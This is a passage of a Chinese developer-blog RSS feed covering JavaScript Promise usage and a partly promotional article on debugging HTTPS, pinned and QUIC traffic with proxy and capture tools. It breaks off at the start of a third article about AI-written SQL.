  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"用户数据："</span>, response.<span class="hljs-property">data</span>);
    <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://api.example.com/users/1/orders`</span>);
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"订单数据："</span>, response.<span class="hljs-property">data</span>);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"请求失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-14">5.2 封装回调函数为Promise</h3>
<p>对于一些老的API（如Node.js的fs模块早期方法），它们采用回调函数形式，可通过Promise封装使其支持链式调用。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-comment">// 封装fs.readFile为Promise版本</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">readFilePromise</span>(<span class="hljs-params">path, encoding</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    fs.<span class="hljs-title function_">readFile</span>(path, encoding, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) {
        <span class="hljs-title function_">reject</span>(err); <span class="hljs-comment">// 失败时调用reject</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">resolve</span>(data); <span class="hljs-comment">// 成功时调用resolve</span>
      }
    });
  });
}

<span class="hljs-comment">// 使用封装后的方法</span>
<span class="hljs-title function_">readFilePromise</span>(<span class="hljs-string">"./test.txt"</span>, <span class="hljs-string">"utf8"</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"文件内容："</span>, data);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"读取文件失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-15">5.3 并行处理多个异步任务</h3>
<p>当需要同时执行多个独立的异步任务，并在所有任务完成后进行汇总时，<code>Promise.all</code>是最佳选择。</p>
<pre><code class="hljs language-ini" lang="ini">// 同时获取商品列表、分类列表、用户信息
const <span class="hljs-attr">getGoodsList</span> = axios.get(<span class="hljs-string">"https://api.example.com/goods"</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">getCategoryList</span> = axios.get(<span class="hljs-string">"https://api.example.com/categories"</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">getUserInfo</span> = axios.get(<span class="hljs-string">"https://api.example.com/user"</span>)<span class="hljs-comment">;</span>

Promise.all(<span class="hljs-section">[getGoodsList, getCategoryList, getUserInfo]</span>)
  .then((<span class="hljs-section">[goodsRes, categoryRes, userRes]</span>) =&gt; {
    // 解构赋值获取每个请求的结果
    const <span class="hljs-attr">goods</span> = goodsRes.data<span class="hljs-comment">;</span>
    const <span class="hljs-attr">categories</span> = categoryRes.data<span class="hljs-comment">;</span>
    const <span class="hljs-attr">user</span> = userRes.data<span class="hljs-comment">;</span>
    // 汇总数据并渲染页面
    renderPage(goods, categories, user)<span class="hljs-comment">;</span>
  })
  .catch((err) =&gt; {
    console.error("数据加载失败：", err)<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-16">六、Promise的注意事项</h2>
<ol>
<li><strong>状态不可逆</strong>：一旦Promise的状态从pending转为fulfilled或rejected，就无法再改变。因此，<code>resolve</code>和<code>reject</code>只有第一次调用有效，后续调用会被忽略。</li>
<li><strong>错误捕获</strong>：如果在<code>then</code>的回调函数中抛出错误，会被后续的<code>catch</code>捕获；但如果没有设置<code>catch</code>，未捕获的错误会导致程序报错（在浏览器中会触发<code>unhandledrejection</code>事件）。</li>
<li><strong>链式调用的返回值</strong>：<code>then</code>方法返回的是新的Promise实例，因此链式调用中的每个<code>then</code>都是在处理前一个<code>then</code>的返回结果。</li>
<li><strong>Promise.all的失败快速返回</strong>：<code>Promise.all</code>只要有一个Promise失败就会立即返回失败结果，不会等待其他Promise完成。如果需要等待所有Promise完成再处理结果，应使用<code>Promise.allSettled</code>。</li>
</ol>
<h2 data-id="heading-17">七、总结</h2>
<p>Promise作为JavaScript异步编程的核心方案，通过状态不可逆的机制和链式调用的语法，有效解决了回调地狱问题，让异步代码更具可读性和可维护性。掌握Promise的创建、状态变化、<code>then/catch/finally</code>实例方法以及<code>Promise.all</code>等静态方法，是前端开发者必备的技能。</p>
<p>需要注意的是，Promise并非异步编程的终点，ES2017引入的async/await语法，正是基于Promise的语法糖，进一步简化了异步代码的书写。但要真正理解async/await，必须先扎实掌握Promise的核心原理。希望本文能帮助你深入理解Promise，并在实际开发中灵活运用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案]]></title>    <link>https://juejin.cn/post/7579887768227872802</link>    <guid>https://juejin.cn/post/7579887768227872802</guid>    <pubDate>2025-12-05T03:56:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768227872802" data-draft-id="7579887768227856418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:56:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心猴爷"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心猴爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:56:33.000Z" title="Fri Dec 05 2025 03:56:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近年来，随着浏览器、移动系统、安全标准全面推进加密化，<strong>“HTTPS Everywhere”</strong> 已从理念变为现实。几乎所有 Web 流量、移动端 API、后台服务通信都默认启用 HTTPS，甚至进一步强化到 <strong>HSTS、证书链严格校验、TLS1.3、HTTP/2、HTTP/3（QUIC）</strong> 等机制。</p>
<p>加密全面普及是好事，但对于开发者而言，一个问题随之变得更加突出：</p>
<blockquote>
<p><strong>抓包越来越难了。尤其是在 iOS、移动 App、QUIC、Pinning 等环境下，很多 HTTPS 流量完全无法被传统代理工具解密。</strong></p>
</blockquote>
<p>本篇文章聚焦 <strong>HTTPS Everywhere 时代的抓包难题</strong>，通过工程实践分析 TLS 加密带来的抓包变化，并提供一套能覆盖现代网络场景的抓包方法。</p>
<hr/>
<h2 data-id="heading-0">一、HTTPS Everywhere 为什么让抓包变得更困难？</h2>
<h3 data-id="heading-1"><strong>加密默认开启，抓包工具无法直接查看明文</strong></h3>
<p>无论是浏览器还是 App，大部分请求都强制通过 HTTPS。
加密后只能看到：</p>
<ul>
<li>握手</li>
<li>SNI</li>
<li>加密后的 Application Data</li>
</ul>
<p>业务数据无法直接查看。</p>
<hr/>
<h3 data-id="heading-2"><strong>TLS 证书链严格校验</strong></h3>
<p>iOS/macOS/浏览器会校验证书链：</p>
<ul>
<li>中间证书缺失</li>
<li>根证书不被信任</li>
<li>自签证书不被接受</li>
</ul>
<p>都会导致代理抓包工具无法解密，表现为：</p>
<ul>
<li>Charles 只看到 CONNECT</li>
<li>Fiddler 显示 Tunnel Established</li>
<li>App 报 SSL 错误</li>
</ul>
<hr/>
<h3 data-id="heading-3"><strong>App 普遍加入证书 Pinning</strong></h3>
<p>尤其金融、社交、政务类 App，Pinning 会让代理证书直接失效，导致：</p>
<p>浏览器能抓
✘ App 完全抓不到</p>
<hr/>
<h3 data-id="heading-4"><strong>TLS1.3 协议增强加密字段</strong></h3>
<p>TLS1.3：</p>
<ul>
<li>加密握手阶段更多字段</li>
<li>某些客户端禁用降级</li>
</ul>
<p>导致传统“半透明解密”方法更难实现。</p>
<hr/>
<h3 data-id="heading-5"><strong>HTTP/3（QUIC）基于 UDP，不走代理</strong></h3>
<p>QUIC 天然绕过代理机制，因此：</p>
<ul>
<li>Charles / Proxyman 抓不到</li>
<li>Wireshark 能看到 UDP</li>
<li>App 业务依旧正常运行</li>
</ul>
<p>HTTPS Everywhere 时代，QUIC 的普及让抓包难度再上一个台阶。</p>
<hr/>
<h2 data-id="heading-6">二、HTTPS Everywhere 时代的抓包方式必须“分层化”</h2>
<p>为了应对增强加密体系，抓包工具必须按层次协同工作。</p>
<hr/>
<h2 data-id="heading-7"><strong>① 代理层：用于传统 HTTPS 解密（能分析业务明文）</strong></h2>
<p>工具：</p>
<ul>
<li>Charles</li>
<li>Proxyman</li>
<li>Fiddler</li>
<li>mitmproxy</li>
</ul>
<p>适用于：</p>
<ul>
<li>常规 HTTPS</li>
<li>Web 调试</li>
<li>修改请求与响应</li>
</ul>
<p>不适用于：</p>
<ul>
<li>Pinning</li>
<li>QUIC</li>
<li>自定义协议</li>
</ul>
<hr/>
<h2 data-id="heading-8"><strong>② 协议层：分析 TLS、QUIC、TCP 原始数据</strong></h2>
<p>工具：</p>
<ul>
<li>Wireshark</li>
<li>tcpdump</li>
</ul>
<p>适用于：</p>
<ul>
<li>TLS 握手分析</li>
<li>检查证书链</li>
<li>查看 QUIC（UDP）是否存在</li>
<li>判断是否丢包</li>
</ul>
<p>但不足之处是流量太多，不容易按应用区分。</p>
<hr/>
<h2 data-id="heading-9"><strong>③ 底层补抓层：解决“代理无法抓包”的关键</strong></h2>
<p>此层用于捕获<strong>真实的应用网络流量</strong>，不依赖代理。
在 HTTPS Everywhere 环境中，这是不可或缺的抓包方式。</p>
<p>典型需要此层的场景：</p>
<ul>
<li>TLS Pinning</li>
<li>QUIC</li>
<li>WebSocket</li>
<li>自定义 TCP 协议</li>
<li>代理被系统/VPN 覆盖</li>
</ul>
<hr/>
<h2 data-id="heading-10"><strong>抓包大师（Sniffmaster）在 HTTPS Everywhere 抓包体系中的作用</strong></h2>
<h3 data-id="heading-11"><strong>Sniffmaster 能做什么？</strong></h3>
<ul>
<li>捕获 <strong>HTTPS / TCP / UDP / HTTP</strong> 数据流</li>
<li>自动识别协议类型（HTTP、HTTPS、mdns 等）</li>
<li>按 <strong>App / 域名过滤</strong>，降低噪音</li>
<li>数据流多格式展示（明文、HEX、二进制）</li>
<li>导出 <strong>Wireshark 兼容 pcap 文件</strong></li>
<li>支持 JavaScript 拦截器对请求/响应进行修改</li>
<li>适用于 macOS、Windows、iOS 场景</li>
</ul>
<p>特别擅长用于：</p>
<ul>
<li>代理抓不到 HTTPS（pinning）</li>
<li>QUIC 抓包</li>
<li>WebSocket 二进制数据</li>
<li>自定义协议无法被代理识别</li>
<li>需要底层流量与 TLS 握手对比分析</li>
</ul>
<p>Sniffmaster 本质是一种“底层补抓工具”，用于处理 HTTPS Everywhere 环境中的极端抓包场景。</p>
<hr/>
<h2 data-id="heading-12">三、完整抓包流程：在 HTTPS Everywhere 下如何定位问题？</h2>
<hr/>
<h3 data-id="heading-13"><strong>步骤 ①：尝试代理抓包（业务层）</strong></h3>
<p>能解密的场景：</p>
<ul>
<li>开发环境 HTTPS</li>
<li>未开启 pinning</li>
<li>非 QUIC 流量</li>
</ul>
<p>可以直接进行 API 调试。</p>
<hr/>
<h3 data-id="heading-14"><strong>步骤 ②：无法解密 → 检查证书链</strong></h3>
<p>检查：</p>
<ul>
<li>证书是否被完全信任</li>
<li>是否有中间证书缺失</li>
<li>是否存在公司/网络注入的中间代理</li>
</ul>
<hr/>
<h3 data-id="heading-15"><strong>步骤 ③：浏览器能抓 App 抓不到 → Pinning</strong></h3>
<p>此时代理层彻底失效。</p>
<hr/>
<h3 data-id="heading-16"><strong>步骤 ④：部分接口抓不到 → 很可能是 QUIC</strong></h3>
<p>验证方式：</p>
<ul>
<li>Wireshark 查看 UDP 443</li>
<li>使用 Sniffmaster 捕获 UDP 数据流</li>
<li>在 App 中关闭 QUIC 再对比</li>
</ul>
<hr/>
<h3 data-id="heading-17"><strong>步骤 ⑤：代理完全没有流量 → 系统代理被覆盖</strong></h3>
<p>常见于：</p>
<ul>
<li>VPN</li>
<li>MDM</li>
<li>零信任网络</li>
</ul>
<hr/>
<h3 data-id="heading-18"><strong>步骤 ⑥：使用 Sniffmaster 进行底层补抓（关键步骤）</strong></h3>
<p>流程：</p>
<ol>
<li>按 App/域名过滤流量</li>
<li>捕获 HTTPS/TCP/UDP 数据流</li>
<li>导出 pcap 用 Wireshark 分析 TLS/QUIC</li>
<li>定位失败点：
<ul>
<li>pinning？</li>
<li>QUIC？</li>
<li>TLS 握手失败？</li>
<li>自定义协议？</li>
</ul>
</li>
</ol>
<p>这是 HTTPS Everywhere 环境下最可靠的抓包方法。</p>
<hr/>
<h2 data-id="heading-19">四、真实案例：HTTPS Everywhere 环境下部分接口无法抓包</h2>
<p>表现：</p>
<ul>
<li>Charles 抓不到视频相关 HTTPS</li>
<li>Safari 能抓文本接口</li>
<li>Wireshark 出现大量 UDP 包</li>
</ul>
<p>排查：</p>
<ol>
<li>确认代理工具配置正常</li>
<li>确认证书链无误</li>
<li>使用 Sniffmaster 抓取 UDP 流量</li>
<li>导出 pcap → Wireshark 显示 QUIC 连接</li>
<li>conclude：API 使用 HTTP/3，不走代理</li>
</ol>
<p>通过底层数据流，准确定位 QUIC 为根因。</p>
<hr/>
<h2 data-id="heading-20">HTTPS Everywhere 时代，抓包可以分层组合</h2>

























<table><thead><tr><th>层级</th><th>工具</th><th>用途</th></tr></thead><tbody><tr><td>代理层</td><td>Charles / Proxyman / Fiddler</td><td>常规 HTTPS 调试</td></tr><tr><td>协议层</td><td>Wireshark / tcpdump</td><td>分析 TLS、QUIC、TCP</td></tr><tr><td>补抓层</td><td>抓包大师（Sniffmaster）</td><td>捕获底层数据流、解决 pinning/QUIC</td></tr></tbody></table>
<p>HTTPS Everywhere 下，抓包不是单一软件能完成的任务，而是一个完整的分层体系。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[当AI为你写SQL，连数据库都开始谈恋爱了]]></title>    <link>https://juejin.cn/post/7579872561674633225</link>    <guid>https://juejin.cn/post/7579872561674633225</guid>    <pubDate>2025-12-04T16:14:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579872561674633225" data-draft-id="7579785426267619328" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="当AI为你写SQL，连数据库都开始谈恋爱了 "/> <meta itemprop="keywords" content="人工智能,Python,SQL"/> <meta itemprop="datePublished" content="2025-12-04T16:14:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Qilana"/> <meta itemprop="url" content="https://juejin.cn/user/24668014656249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            当AI为你写SQL，连数据库都开始谈恋爱了 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/24668014656249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Qilana
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T16:14:51.000Z" title="Thu Dec 04 2025 16:14:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body 